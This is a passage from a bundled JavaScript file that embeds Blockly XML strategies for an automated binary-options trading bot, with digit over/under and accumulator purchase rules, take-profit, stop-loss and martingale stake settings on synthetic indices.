name="PURCHASE_LIST">ACCU</field>\n          </block>\n        </statement>\n        <value name="IF1">\n          <block type="logic_compare" id="0ATZ=?+8dO`ta|``8_#z">\n            <field name="OP">LTE</field>\n            <value name="A">\n              <block type="math_arithmetic" id="!-b4m+eIA~@w3_MR5V;4">\n                <field name="OP">MINUS</field>\n                <value name="A">\n                  <shadow type="math_number" id="Dw7Og]Q#*`Zd!]0-/`E^">\n                    <field name="NUM">1</field>\n                  </shadow>\n                  <block type="variables_get" id="4@)?nu]}Z{-EmWsS#OE8">\n                    <field name="VAR" id="v0#K)Yv=:6aveYI=_VhD" variabletype="">Tick1</field>\n                  </block>\n                </value>\n                <value name="B">\n                  <shadow type="math_number" id="#*NT:p3S7.7uT8c8.Z0(">\n                    <field name="NUM">1</field>\n                  </shadow>\n                  <block type="variables_get" id="DP^D_BNfZdcX{Fy?M]WB">\n                    <field name="VAR" id="-[Ex/`)z2txY;Be[@EIw" variabletype="">Tick2</field>\n                  </block>\n                </value>\n              </block>\n            </value>\n            <value name="B">\n              <block type="math_single" id="Aq*7S-d,C3k$s3xz-D6/">\n                <field name="OP">NEG</field>\n                <value name="NUM">\n                  <shadow type="math_number" id="#AJb,FE+u|8E7mE:F)q)">\n                    <field name="NUM">0.76</field>\n                  </shadow>\n                  <block type="variables_get" id="3-XqV*^iIIZHR^aQbb~@">\n                    <field name="VAR" id="c5x[j6BD?M)k#Ju|WH:c" variabletype="">+- Barrier</field>\n                  </block>\n                </value>\n              </block>\n            </value>\n          </block>\n        </value>\n        <statement name="DO1">\n          <block type="apollo_purchase" id="6_]WNv:dQfD1+i_v#Mdd">\n            <field name="PURCHASE_LIST">ACCU</field>\n          </block>\n        </statement>\n      </block>\n    </statement>\n  </block>\n  <block type="procedures_defnoreturn" id=".e|16|%S+U3$1WmD:a!/" collapsed="true" x="0" y="1440">\n    <field name="NAME">RM</field>\n    <statement name="STACK">\n      <block type="variables_set" id="nG{34_1%Ev*;h%p={]SP">\n        <field name="VAR" id="04q-.{_G9CBq.X?}P%IO" variabletype="">initial_stake</field>\n        <value name="VALUE">\n          <block type="variables_get" id="!7mGu(X^;-LC;Fhj~mBP">\n            <field name="VAR" id="La:_zTw{G0#OAi$rQ/.d" variabletype="">stake</field>\n          </block>\n        </value>\n        <next>\n          <block type="variables_set" id="U}S9k^WoA?3PxHkdJ%tr">\n            <field name="VAR" id="S[tY,FqC12p:kfT^VLxC" variabletype="">initial_acc_take_profit</field>\n            <value name="VALUE">\n              <block type="variables_get" id="![=DE{q^R.A{,vidld`m">\n                <field name="VAR" id="[^Q7)A01y-@q!py6Gk`q" variabletype="">TP</field>\n              </block>\n            </value>\n          </block>\n        </next>\n      </block>\n    </statement>\n  </block>\n  <block type="procedures_defreturn" id="`|HyrV{(=2kzuE||#1@h" collapsed="true" x="0" y="1536">\n    <mutation>\n      <arg name="% return" varid="XSBe.@kGe^oO{Q}qzhuN"></arg>\n    </mutation>\n    <field name="NAME">%Take Profit</field>\n    <statement name="STACK">\n      <block type="variables_set" id="#Ov|^mwHn[DBxhz.:DNr">\n        <field name="VAR" id="XSBe.@kGe^oO{Q}qzhuN" variabletype="">% return</field>\n        <value name="VALUE">\n          <block type="math_arithmetic" id="h,r9HVrl$R:E8wSQ!4yj">\n            <field name="OP">DIVIDE</field>\n            <value name="A">\n              <shadow type="math_number" id="=T5q!KQkkc{AwnCBci*E">\n                <field name="NUM">1</field>\n              </shadow>\n              <block type="variables_get" id="}gXwfWMXAUUgih^fM)R!">\n                <field name="VAR" id="XSBe.@kGe^oO{Q}qzhuN" variabletype="">% return</field>\n              </block>\n            </value>\n            <value name="B">\n              <shadow type="math_number" id="5;CYKrBK=E-t+ya_Rs5b">\n                <field name="NUM">100</field>\n              </shadow>\n            </value>\n          </block>\n        </value>\n        <next>\n          <block type="variables_set" id="o?+c}xuo`AmkyFzY-R?[">\n            <field name="VAR" id="PT$/n3r(93P7|v+-%Z:1" variabletype="">Take Profit</field>\n            <value name="VALUE">\n              <block type="math_arithmetic" id="QkN[OcLP#1;G?jX$uoxm">\n                <field name="OP">MULTIPLY</field>\n                <value name="A">\n                  <shadow type="math_number" id="(vEu9.d{!h|H|I@:2MM-">\n                    <field name="NUM">1</field>\n                  </shadow>\n                  <block type="variables_get" id="AcxUsqt5v9:~bNh@SWe7">\n                    <field name="VAR" id="XSBe.@kGe^oO{Q}qzhuN" variabletype="">% return</field>\n                  </block>\n                </value>\n                <value name="B">\n                  <shadow type="math_number" id="?_CEOXU-HZ^qPS^5d_Rz">\n                    <field name="NUM">100</field>\n                  </shadow>\n                  <block type="variables_get" id="`V,Le[JWeD@jQc=Xv^l0">\n                    <field name="VAR" id="La:_zTw{G0#OAi$rQ/.d" variabletype="">stake</field>\n                  </block>\n                </value>\n              </block>\n            </value>\n          </block>\n        </next>\n      </block>\n    </statement>\n    <value name="RETURN">\n      <block type="variables_get" id="FAZxyujX^Oz$LH*s(s!=">\n        <field name="VAR" id="PT$/n3r(93P7|v+-%Z:1" variabletype="">Take Profit</field>\n      </block>\n    </value>\n  </block>\n  <block type="tick_analysis" id="O1p4_v.Tetwu*mA6H[5#" collapsed="true" x="0" y="1632">\n    <statement name="TICKANALYSIS_STACK">\n      <block type="variables_set" id="e32ZoQ1oFTX($0`A)v+0">\n        <field name="VAR" id="-[Ex/`)z2txY;Be[@EIw" variabletype="">Tick2</field>\n        <value name="VALUE">\n          <block type="variables_get" id="}f,BT`]!1a#l-Dz_VvCo">\n            <field name="VAR" id="v0#K)Yv=:6aveYI=_VhD" variabletype="">Tick1</field>\n          </block>\n        </value>\n        <next>\n          <block type="variables_set" id="`)+)w#yq/_N5wkkDmX;x">\n            <field name="VAR" id="v0#K)Yv=:6aveYI=_VhD" variabletype="">Tick1</field>\n            <value name="VALUE">\n              <block type="tick" id="cM/Ik!zkoW+J_u(Ly$/G"></block>\n            </value>\n            <next>\n              <block type="btnotify" id="6*E7$=%ch@.P9DHAI/Wa">\n                <field name="NOTIFICATION_TYPE">success</field>\n                <field name="NOTIFICATION_SOUND">silent</field>\n                <value name="MESSAGE">\n                  <shadow type="text" id="C)i]9ip)y4q*xML]kIiU">\n                    <field name="TEXT">Binarytool</field>\n                  </shadow>\n                  <block type="math_arithmetic" id="+r$3;y:zY|V*@sq:6qc@">\n                    <field name="OP">MINUS</field>\n                    <value name="A">\n                      <shadow type="math_number" id="qPi)vbZll;9nR$9S+Ewu">\n                        <field name="NUM">1</field>\n                      </shadow>\n                      <block type="variables_get" id="PuEeWwVR0j!X2N|7H])5">\n                        <field name="VAR" id="v0#K)Yv=:6aveYI=_VhD" variabletype="">Tick1</field>\n                      </block>\n                    </value>\n                    <value name="B">\n                      <shadow type="math_number" id="p6$G7BR|SCO}*[tk.nYl">\n                        <field name="NUM">1</field>\n                      </shadow>\n                      <block type="variables_get" id="N+aO]Qpo.f831!SwG:0j">\n                        <field name="VAR" id="-[Ex/`)z2txY;Be[@EIw" variabletype="">Tick2</field>\n                      </block>\n                    </value>\n                  </block>\n                </value>\n              </block>\n            </next>\n          </block>\n        </next>\n      </block>\n    </statement>\n  </block>\n</xml>'
            },
            98141: function(e, t, n) {
                "use strict";
                n.r(t), n.d(t, {
                    default: function() {
                        return a
                    }
                });
                let a = '<xml xmlns="http://www.w3.org/1999/xhtml" is_dbot="true" collection="false">\n  <variables>\n    <variable type="" id="VLBj7P@:FqNy~,R[c9Hp" islocal="false" iscloud="false">Prediction</variable>\n    <variable type="" id="}4sS3G-ig-*lgLxN.HK~" islocal="false" iscloud="false">Entry Point</variable>\n    <variable type="" id="r3#,*L{|k_*_oikco?~E" islocal="false" iscloud="false">Stake</variable>\n    <variable type="" id="Qq28jzu{61V^?3_DKY1z" islocal="false" iscloud="false">text</variable>\n    <variable type="" id="!(67Y!ov*~[U/$pjZ,0." islocal="false" iscloud="false">Stake win</variable>\n    <variable type="" id="x4khAyN_n|huu=qVhBFG" islocal="false" iscloud="false">item</variable>\n    <variable type="" id="Z@.ow_sBjxwtbL$F52.u" islocal="false" iscloud="false">Martingale</variable>\n    <variable type="" id="_$b#PTe$SH2iW}Unna2W" islocal="false" iscloud="false">Use Martingale</variable>\n    <variable type="" id="iexW!(p-QSL[kDvWK`o-" islocal="false" iscloud="false">Take Profit</variable>\n    <variable type="" id="AwGIX3K`=6@AOl/-`G)O" islocal="false" iscloud="false">Stop Loss</variable>\n    <variable type="" id="tpKgmnH0mz*.t/T=*i|V" islocal="false" iscloud="false">Maximum Runs</variable>\n    <variable type="" id="@VN/)JBDaz5d-aHKEiy:" islocal="false" iscloud="false">Switch Markets</variable>\n    <variable type="" id="nL}rZqx,y/BJNYaP$b:T" islocal="false" iscloud="false">Next trade</variable>\n    <variable type="" id="*--].`DnOHQt$4)m~g4q" islocal="false" iscloud="false">Over 0</variable>\n    <variable type="" id="AH3o]/[Il4Vqah/Cpy%5" islocal="false" iscloud="false">Under 9</variable>\n    <variable type="" id="EyYZFSoOM?_MS_~x:Z^(" islocal="false" iscloud="false">Stop Trading on loss</variable>\n    <variable type="" id="S58/v7q-;.szsCzu^Vvo" islocal="false" iscloud="false">Total Lost</variable>\n    <variable type="" id="ITcU7:kSbe)cNBWn8K#R" islocal="false" iscloud="false">Count Loss</variable>\n    <variable type="" id="Vd)a}rnFL$Mr`V[FG0ZX" islocal="false" iscloud="false">Count</variable>\n  </variables>\n  <block type="trade_definition" id="Dn+|l@F{1c%e:[S_b*y+" deletable="false" x="0" y="60">\n    <statement name="TRADE_OPTIONS">\n      <block type="trade_definition_market" id="?%-k%1.^XwP?^NTZ,Yt%" deletable="false" movable="false">\n        <field name="MARKET_LIST">synthetic_index</field>\n        <field name="SUBMARKET_LIST">random_index</field>\n        <field name="SYMBOL_LIST">1HZ10V</field>\n        <next>\n          <block type="trade_definition_tradetype" id="Ny,T+]j~q=euwb2^Hkrt" deletable="false" movable="false">\n            <field name="TRADETYPECAT_LIST">digits</field>\n            <field name="TRADETYPE_LIST">overunder</field>\n            <next>\n              <block type="trade_definition_contracttype" id="9KwoosLzczeC~F:5~JTl" deletable="false" movable="false">\n                <field name="TYPE_LIST">both</field>\n                <next>\n                  <block type="trade_definition_candleinterval" id="YCRtYsVDuvI2m(|Sn=oN" deletable="false" movable="false">\n                    <field name="CANDLEINTERVAL_LIST">60</field>\n                    <next>\n                      <block type="trade_definition_restartbuysell" id="5Nn9BCfR{SxZMWof=~U6" deletable="false" movable="false">\n                        <field name="TIME_MACHINE_ENABLED">FALSE</field>\n                        <next>\n                          <block type="trade_definition_restartonerror" id="$w}(v#RJo+GTV~6N#rJ(" deletable="false" movable="false">\n                            <field name="RESTARTONERROR">TRUE</field>\n                          </block>\n                        </next>\n                      </block>\n                    </next>\n                  </block>\n                </next>\n              </block>\n            </next>\n          </block>\n        </next>\n      </block>\n    </statement>\n    <statement name="INITIALIZATION">\n      <block type="variables_set" id="VtinTUlRho|l^-0R$7%A">\n        <field name="VAR" id="r3#,*L{|k_*_oikco?~E" variabletype="">Stake</field>\n        <value name="VALUE">\n          <block type="math_number" id="eE1:{)l/a]lYGgEq(xNf">\n            <field name="NUM">0.5</field>\n          </block>\n        </value>\n        <next>\n          <block type="variables_set" id="yuTs63H@^mt2$7WA8MM#">\n            <field name="VAR" id="iexW!(p-QSL[kDvWK`o-" variabletype="">Take Profit</field>\n            <value name="VALUE">\n              <block type="math_number" id="Ze7;s[0;Nz2%O4S_83gA">\n                <field name="NUM">5</field>\n              </block>\n            </value>\n            <next>\n              <block type="variables_set" id="nGr}CP0n6hP98*@D%p1~">\n                <field name="VAR" id="AwGIX3K`=6@AOl/-`G)O" variabletype="">Stop Loss</field>\n                <value name="VALUE">\n                  <block type="math_number" id="CNwP055C@dZ]pl;V~^@e">\n                    <field name="NUM">30</field>\n                  </block>\n                </value>\n                <next>\n                  <block type="variables_set" id="OsGf7Gg0%Bcr(O%2{xCZ">\n                    <field name="VAR" id="Z@.ow_sBjxwtbL$F52.u" variabletype="">Martingale</field>\n                    <value name="VALUE">\n                      <block type="math_number" id="A:w{a,.n|YO,bwZCpH[w">\n                        <field name="NUM">5</field>\n                      </block>\n                    </value>\n                    <next>\n                      <block type="variables_set" id="l!28PD.;#a94j}-Zny(w">\n                        <field name="VAR" id="_$b#PTe$SH2iW}Unna2W" variabletype="">Use Martingale</field>\n                        <value name="VALUE">\n                          <block type="logic_boolean" id="yGRw;hhT=8$k[bq6[a5v">\n                            <field name="BOOL">FALSE</field>\n                          </block>\n                        </value>\n                        <next>\n                          <block type="variables_set" id="I-tw}E3wa6t2?-7un5%W">\n                            <field name="VAR" id="@VN/)JBDaz5d-aHKEiy:" variabletype="">Switch Markets</field>\n                            <value name="VALUE">\n                              <block type="logic_boolean" id="nEAPjl%ws7=.-TTk$d5j">\n                                <field name="BOOL">TRUE</field>\n                              </block>\n                            </value>\n                            <next>\n                              <block type="variables_set" id="+|3)-`f/qVr`m0B0;z(d">\n                                <field name="VAR" id="EyYZFSoOM?_MS_~x:Z^(" variabletype="">Stop Trading on loss</field>\n                                <value name="VALUE">\n                                  <block type="logic_boolean" id="HL_;+VpMGGdymGC[NN%7">\n                                    <field name="BOOL">FALSE</field>\n                                  </block>\n                                </value>\n                                <next>\n                                  <block type="variables_set" id="cDt^{%2b6}0F^KwAWoZ|" collapsed="true">\n                                    <field name="VAR" id="nL}rZqx,y/BJNYaP$b:T" variabletype="">Next trade</field>\n                                    <value name="VALUE">\n                                      <block type="text" id="7-dU{:DF[`~${DPrwRqd">\n                                        <field name="TEXT">Under</field>\n                                      </block>\n                                    </value>\n                                    <next>\n                                      <block type="variables_set" id="04?NsjPy@EcVaNBFvS~q" collapsed="true">\n                                        <field name="VAR" id="!(67Y!ov*~[U/$pjZ,0." variabletype="">Stake win</field>\n                                        <value name="VALUE">\n                                          <block type="variables_get" id="x|YP+!A%~5?j+94P(AuL">\n                                            <field name="VAR" id="r3#,*L{|k_*_oikco?~E" variabletype="">Stake</field>\n                                          </block>\n                                        </value>\n                                        <next>\n                                          <block type="variables_set" id=",N%:N5HXk:D9]dYCQJ-N" collapsed="true">\n                                            <field name="VAR" id="Vd)a}rnFL$Mr`V[FG0ZX" variabletype="">Count</field>\n                                            <value name="VALUE">\n                                              <block type="math_number" id="%dG/.3}`9pxjxDYvt3t$">\n                                                <field name="NUM">0</field>\n                                              </block>\n                                            </value>\n                                          </block>\n                                        </next>\n                                      </block>\n                                    </next>\n                                  </block>\n                                </next>\n                              </block>\n                            </next>\n                          </block>\n                        </next>\n                      </block>\n                    </next>\n                  </block>\n                </next>\n              </block>\n            </next>\n          </block>\n        </next>\n      </block>\n    </statement>\n    <statement name="SUBMARKET">\n      <block type="controls_if" id="4yuK|P)X[jgCh+,5iS,#">\n        <mutation else="1"></mutation>\n        <value name="IF0">\n          <block type="logic_compare" id="jj7?J?-_ya[J9E,+#%Cc">\n            <field name="OP">EQ</field>\n            <value name="A">\n              <block type="variables_get" id="KzAX8!g|YUmkj_wV3w0o">\n                <field name="VAR" id="nL}rZqx,y/BJNYaP$b:T" variabletype="">Next trade</field>\n              </block>\n            </value>\n            <value name="B">\n              <block type="text" id="[y5t1B%WCT58;li9$q)|">\n                <field name="TEXT">Under</field>\n              </block>\n            </value>\n          </block>\n        </value>\n        <statement name="DO0">\n          <block type="trade_definition_tradeoptions" id="WeNX1fen.XO?FdRLm_m^">\n            <mutation has_first_barrier="false" has_second_barrier="false" has_prediction="true"></mutation>\n            <field name="DURATIONTYPE_LIST">t</field>\n            <value name="DURATION">\n              <shadow type="math_number_positive" id="},}3yJ69-J-gHxwa*8N:">\n                <field name="NUM">1</field>\n              </shadow>\n            </value>\n            <value name="AMOUNT">\n              <shadow type="math_number_positive" id="f;YaY;efEV^HkE4fJgY/">\n                <field name="NUM">1</field>\n              </shadow>\n              <block type="variables_get" id="#=u;*~XqDVf(6j+LY9ZD">\n                <field name="VAR" id="r3#,*L{|k_*_oikco?~E" variabletype="">Stake</field>\n              </block>\n            </value>\n            <value name="PREDICTION">\n              <shadow type="math_number_positive" id="*;vuggdXL:P~0WSl#a@n">\n                <field name="NUM">1</field>\n              </shadow>\n              <block type="math_number" id=":#),L7:nJWVfkXw;?Py:">\n                <field name="NUM">1</field>\n              </block>\n            </value>\n          </block>\n        </statement>\n        <statement name="ELSE">\n          <block type="trade_definition_tradeoptions" id=")2;2*D/$2pgX[q!*kxgp">\n            <mutation has_first_barrier="false" has_second_barrier="false" has_prediction="true"></mutation>\n            <field name="DURATIONTYPE_LIST">t</field>\n            <value name="DURATION">\n              <shadow type="math_number_positive" id=":D]*%PuYHSi,!G?lp.GK">\n                <field name="NUM">1</field>\n              </shadow>\n            </value>\n            <value name="AMOUNT">\n              <shadow type="math_number_positive" id="DR$FNlbO~7jun|dy*5C1">\n                <field name="NUM">1</field>\n              </shadow>\n              <block type="variables_get" id="yps9ix^qx%0T]|pcs668">\n                <field name="VAR" id="r3#,*L{|k_*_oikco?~E" variabletype="">Stake</field>\n              </block>\n            </value>\n            <value name="PREDICTION">\n              <shadow type="math_number_positive" id="[z=h{F#Gyh8q;{Y1xM!0">\n                <field name="NUM">1</field>\n              </shadow>\n              <block type="math_number" id=",BH2l#9FN8I/f9TWD]0b">\n                <field name="NUM">8</field>\n              </block>\n            </value>\n          </block>\n        </statement>\n      </block>\n    </statement>\n  </block>\n  <block type="after_purchase" id="N|p|#TF(n)T5q(2;:E_L" collapsed="true" x="890" y="60">\n    <statement name="AFTERPURCHASE_STACK">\n      <block type="controls_if" id="z;c[K$OpqdAjU*wCLl*9">\n        <mutation elseif="1" else="1"></mutation>\n        <value name="IF0">\n          <block type="logic_compare" id="NHjJbm[Cijv~Ley/ZvIr">\n            <field name="OP">GTE</field>\n            <value name="A">\n              <block type="total_profit" id="mmY6mRJMyW:XJT7y-BUk"></block>\n            </value>\n            <value name="B">\n              <block type="variables_get" id="Qu^BJ/f~0@mXd]Vf[#2w">\n                <field name="VAR" id="iexW!(p-QSL[kDvWK`o-" variabletype="">Take Profit</field>\n              </block>\n            </value>\n          </block>\n        </value>\n        <statement name="DO0">\n          <block type="text_print" id="N(zlzQ$brWJvN0,0xxB5">\n            <value name="TEXT">\n              <shadow type="text" id="@eqR_i-,.3g]~5e/`t~F">\n                <field name="TEXT">Take Profit Hit</field>\n              </shadow>\n            </value>\n          </block>\n        </statement>\n        <value name="IF1">\n          <block type="logic_compare" id="gU^da0)!38=fPrv[Rz3T">\n            <field name="OP">LTE</field>\n            <value name="A">\n              <block type="total_profit" id="#Ns63Q/r5HW*!La^07U-"></block>\n            </value>\n            <value name="B">\n              <block type="math_single" id="y)htA1wy)WnQ,7:f(MkN">\n                <field name="OP">NEG</field>\n                <value name="NUM">\n                  <shadow type="math_number" id="z8}-_]UDkc8rkuzJ(ckC">\n                    <field name="NUM">9</field>\n                  </shadow>\n                  <block type="variables_get" id="[F8%a@pBeA2Ks[Q=.Vik">\n                    <field name="VAR" id="AwGIX3K`=6@AOl/-`G)O" variabletype="">Stop Loss</field>\n                  </block>\n                </value>\n              </block>\n            </value>\n          </block>\n        </value>\n        <statement name="DO1">\n          <block type="text_print" id="5|so};ejYw%-A{s=d5;Q">\n            <value name="TEXT">\n              <shadow type="text" id=")01HACF%x-bW*#tiNBaS">\n                <field name="TEXT">Sorry Stop Loss Hit</field>\n              </shadow>\n            </value>\n          </block>\n        </statement>\n        <statement name="ELSE">\n          <block type="controls_if" id="(~~!1CBdadAhV8aPYMI0">\n            <mutation else="1"></mutation>\n            <value name="IF0">\n              <block type="contract_check_result" id="RQXD%_pE6|`{LQdh#sXt">\n                <field name="CHECK_RESULT">loss</field>\n              </block>\n            </value>\n            <statement name="DO0">\n              <block type="controls_if" id="+?8Z.DfA=Zet`YxX%8si">\n                <mutation else="1"></mutation>\n                <value name="IF0">\n                  <block type="logic_compare" id="@b50qr+`dDSTwoa_IiU$">\n                    <field name="OP">EQ</field>\n                    <value name="A">\n                      <block type="variables_get" id="j$X0.fVQu`k{T#M#NV8I">\n                        <field name="VAR" id="_$b#PTe$SH2iW}Unna2W" variabletype="">Use Martingale</field>\n                      </block>\n                    </value>\n                    <value name="B">\n                      <block type="logic_boolean" id="zq+?6}?-v},jig5LeUqv">\n                        <field name="BOOL">TRUE</field>\n                      </block>\n                    </value>\n                  </block>\n                </value>\n                <statement name="DO0">\n                  <block type="variables_set" id="hpGUBN@n:%puMqtwr^^=">\n                    <field name="VAR" id="r3#,*L{|k_*_oikco?~E" variabletype="">Stake</field>\n                    <value name="VALUE">\n                      <block type="math_arithmetic" id="}sk@_ouH)[3;j?BLBb7b">\n                        <field name="OP">MULTIPLY</field>\n                        <value name="A">\n                          <shadow type="math_number" id="sAa/m#%`t/-:kVi9US8g">\n                            <field name="NUM">1</field>\n                          </shadow>\n                          <block type="variables_get" id="7^v$f#:k9p+Jd!!pLVmr">\n                            <field name="VAR" id="r3#,*L{|k_*_oikco?~E" variabletype="">Stake</field>\n                          </block>\n                        </value>\n                        <value name="B">\n                          <shadow type="math_number" id="ew#0r(._R^PpJ27dlBJr">\n                            <field name="NUM">2</field>\n                          </shadow>\n                          <block type="variables_get" id="b7$Pw$~A(vYSJ?Q3*;HM">\n                            <field name="VAR" id="Z@.ow_sBjxwtbL$F52.u" variabletype="">Martingale</field>\n                          </block>\n                        </value>\n                      </block>\n                    </value>\n                  </block>\n                </statement>\n                <statement name="ELSE">\n                  <block type="variables_set" id="=k*Rc`VF=muad@A{I(_F">\n                    <field name="VAR" id="r3#,*L{|k_*_oikco?~E" variabletype="">Stake</field>\n                    <value name="VALUE">\n                      <block type="variables_get" id="wucnM!}{i+P:SW(}shM~">\n                        <field name="VAR" id="!(67Y!ov*~[U/$pjZ,0." variabletype="">Stake win</field>\n                      </block>\n                    </value>\n                  </block>\n                </statement>\n                <next>\n                  <block type="controls_if" id="o|jX{~Eewc,8$1!Q2bI~" collapsed="true">\n                    <mutation else="1"></mutation>\n                    <value name="IF0">\n                      <block type="logic_compare" id="|TkJ=fMG6*@}u`(Vk/xc">\n                        <field name="OP">NEQ</field>\n                        <value name="A">\n                          <block type="variables_get" id="7DCTyU[Xp7}rg/@]SD+4">\n                            <field name="VAR" id="nL}rZqx,y/BJNYaP$b:T" variabletype="">Next trade</field>\n                          </block>\n                        </value>\n                        <value name="B">\n                          <block type="text" id="!30LlaXe~p+lk:yoWR@i">\n                            <field name="TEXT">Under</field>\n                          </block>\n                        </value>\n                      </block>\n                    </value>\n                    <statement name="DO0">\n                      <block type="variables_set" id="8j30Yjg)pH[{R?;lc%oX">\n                        <field name="VAR" id="nL}rZqx,y/BJNYaP$b:T" variabletype="">Next trade</field>\n                        <value name="VALUE">\n                          <block type="text" id="vf/U6aYNV7.9^-;lZdz_">\n                            <field name="TEXT">Under</field>\n                          </block>\n                        </value>\n                      </block>\n                    </statement>\n                    <statement name="ELSE">\n                      <block type="variables_set" id="%A[4_:[?BY-[{uREeITg">\n                        <field name="VAR" id="nL}rZqx,y/BJNYaP$b:T" variabletype="">Next trade</field>\n                        <value name="VALUE">\n                          <block type="text" id="(*zGS[vH7g8NA1W0ByeS">\n                            <field name="TEXT">Over</field>\n                          </block>\n                        </value>\n                      </block>\n                    </statement>\n                  </block>\n                </next>\n              </block>\n            </statement>\n            <statement name="ELSE">\n              <block type="variables_set" id=":E7qMnqf-^+mU})i.S~n">\n                <field name="VAR" id="r3#,*L{|k_*_oikco?~E" variabletype="">Stake</field>\n                <value name="VALUE">\n                  <block type="variables_get" id="t6h)WB6{sCpQMs~;BUx1">\n                    <field name="VAR" id="!(67Y!ov*~[U/$pjZ,0." variabletype="">Stake win</field>\n                  </block>\n                </value>\n                <next>\n                  <block type="controls_if" id="OE$WEm$R:#7+z,!75Kc`" collapsed="true">\n                    <mutation else="1"></mutation>\n                    <value name="IF0">\n                      <block type="logic_compare" id="Rl2mt,UMb@;2=a8=Gr=0">\n                        <field name="OP">NEQ</field>\n                        <value name="A">\n                          <block type="variables_get" id="BF]C#G.Y?uu}}u@JPA=h">\n                            <field name="VAR" id="nL}rZqx,y/BJNYaP$b:T" variabletype="">Next trade</field>\n                          </block>\n                        </value>\n                        <value name="B">\n                          <block type="text" id="!z1q]ahvtPiDx93=-C,=">\n                            <field name="TEXT">Under</field>\n                          </block>\n                        </value>\n                      </block>\n                    </value>\n                    <statement name="DO0">\n                      <block type="variables_set" id="I=1d`{ey6=/_b5oZCL5W">\n                        <field name="VAR" id="nL}rZqx,y/BJNYaP$b:T" variabletype="">Next trade</field>\n                        <value name="VALUE">\n                          <block type="text" id="G_)Q5_q4]2XXTq=:vG]z">\n                            <field name="TEXT">Under</field>\n                          </block>\n                        </value>\n                      </block>\n                    </statement>\n                    <statement name="ELSE">\n                      <block type="variables_set" id="gVK//flXx|HG}8wxQ1z~">\n                        <field name="VAR" id="nL}rZqx,y/BJNYaP$b:T" variabletype="">Next trade</field>\n                        <value name="VALUE">\n                          <block type="text" id=";@iTjsiyg$T)*z4JU0^1">\n                            <field name="TEXT">Over</field>\n                          </block>\n                        </value>\n                      </block>\n                    </statement>\n                  </block>\n                </next>\n              </block>\n            </statement>\n            <next>\n              <block type="controls_if" id="P*2G/7pG)[`#SyTacp:J">\n                <mutation else="1"></mutation>\n                <value name="IF0">\n                  <block type="logic_operation" id="=@1,Y?Y/JAVi(p{VB$OM">\n                    <field name="OP">AND</field>\n                    <value name="A">\n                      <block type="contract_check_result" id="XD?S5~IBQc.bq@w%oO/)">\n                        <field name="CHECK_RESULT">loss</field>\n                      </block>\n                    </value>\n                    <value name="B">\n                      <block type="logic_compare" id="4-UTD+52:UqjiP[c7$0_">\n                        <field name="OP">EQ</field>\n                        <value name="A">\n                          <block type="variables_get" id="ev%F9Rc{7C4AfAQA0,Uz">\n                            <field name="VAR" id="EyYZFSoOM?_MS_~x:Z^(" variabletype="">Stop Trading on loss</field>\n                          </block>\n                        </value>\n                        <value name="B">\n                          <block type="logic_boolean" id="s{I{CZMdhvDcgB]S{Sk4">\n                            <field name="BOOL">TRUE</field>\n                          </block>\n                        </value>\n                      </block>\n                    </value>\n                  </block>\n                </value>\n                <statement name="DO0">\n                  <block type="text_print" id="()KQ|q%LWOY^#4g@iJeE">\n                    <value name="TEXT">\n                      <shadow type="text" id="WE[z5IH1aLRIlIJrGX{P">\n                        <field name="TEXT">Sorry Bot Stopped After Loss</field>\n                      </shadow>\n                    </value>\n                  </block>\n                </statement>\n                <statement name="ELSE">\n                  <block type="trade_again" id="i:whR5o)${ZEhJ;*aB^d"></block>\n                </statement>\n              </block>\n            </next>\n          </block>\n        </statement>\n      </block>\n    </statement>\n  </block>\n  <block type="before_purchase" id="V/jf;#b@;*@3ATM]D)=;" collapsed="true" deletable="false" x="0" y="1284">\n    <statement name="BEFOREPURCHASE_STACK">\n      <block type="controls_if" id="42TJOh33!rm$JB,Q#Gc+">\n        <mutation else="1"></mutation>\n        <value name="IF0">\n          <block type="logic_compare" id="TioHx0i*W%iT#d;g4]mz">\n            <field name="OP">EQ</field>\n            <value name="A">\n              <block type="variables_get" id="XU#u@(wT8!C?9C;Dj@3I">\n                <field name="VAR" id="nL}rZqx,y/BJNYaP$b:T" variabletype="">Next trade</field>\n              </block>\n            </value>\n            <value name="B">\n              <block type="text" id="zmLNtl0?@GHLlKLthUTc">\n                <field name="TEXT">Under</field>\n              </block>\n            </value>\n          </block>\n        </value>\n        <statement name="DO0">\n          <block type="controls_if" id="pjbQJid^.):a`k`_39sg">\n            <value name="IF0">\n              <block type="logic_compare" id="68%a_=9nG~9_s|.|8M`?">\n                <field name="OP">LTE</field>\n                <value name="A">\n                  <block type="last_digit" id="rAHgek2bT_Re}MoZB~I$"></block>\n                </value>\n                <value name="B">\n                  <block type="math_number" id="G_8=u]%SwVo^Su+GAhsV">\n                    <field name="NUM">2</field>\n                  </block>\n                </value>\n              </block>\n            </value>\n            <statement name="DO0">\n              <block type="apollo_purchase" id="ZIu(a,2Hj/!q4UzZ%=8_">\n                <field name="PURCHASE_LIST">DIGITOVER</field>\n              </block>\n            </statement>\n          </block>\n        </statement>\n        <statement name="ELSE">\n          <block type="controls_if" id="AZgW[XXZ;Q3s)fSWIbp.">\n            <value name="IF0">\n              <block type="logic_compare" id="~HL]1{=S$A~i]}$l%nPm">\n                <field name="OP">GTE</field>\n                <value name="A">\n                  <block type="last_digit" id="#_YvZ/m^u!bev=Zk2yS1"></block>\n                </value>\n                <value name="B">\n                  <block type="math_number" id=".)K4wIfG4$8?nlWZMM/B">\n                    <field name="NUM">7</field>\n                  </block>\n                </value>\n              </block>\n            </value>\n            <statement name="DO0">\n              <block type="apollo_purchase" id="#KNbzuc5chSS,78m#(Pd">\n                <field name="PURCHASE_LIST">DIGITUNDER</field>\n              </block>\n            </statement>\n          </block>\n        </statement>\n        <next>\n          <block type="procedures_callnoreturn" id="W]/99p4AY6,$8SPFGlj@">\n            <mutation name="Switch Markets"></mutation>\n            <data>FrhP.v@2:JZ=^x?jnS$%</data>\n            <next>\n              <block type="text_join" id="D={8du*d/_2-6kHbCktj" collapsed="true">\n                <field name="VARIABLE" id="Qq28jzu{61V^?3_DKY1z" variabletype="">text</field>\n                <statement name="STACK">\n                  <block type="text_statement" id="[T:T(wc/J!yu,^99{.hB">\n                    <value name="TEXT">\n                      <shadow type="text" id="t5L]]NVSx!UgB8Fql_@#">\n                        <field name="TEXT">Last Digit: </field>\n                      </shadow>\n                    </value>\n                    <next>\n                      <block type="text_statement" id="HN*sLdw}#)(t#cZ;jFAH">\n                        <value name="TEXT">\n                          <shadow type="text" id="}9ulm=y607lniFm]OTG2">\n                            <field name="TEXT"></field>\n                          </shadow>\n                          <block type="last_digit" id="0!/zDZx?Xq@o{EHs`?v1"></block>\n                        </value>\n                      </block>\n          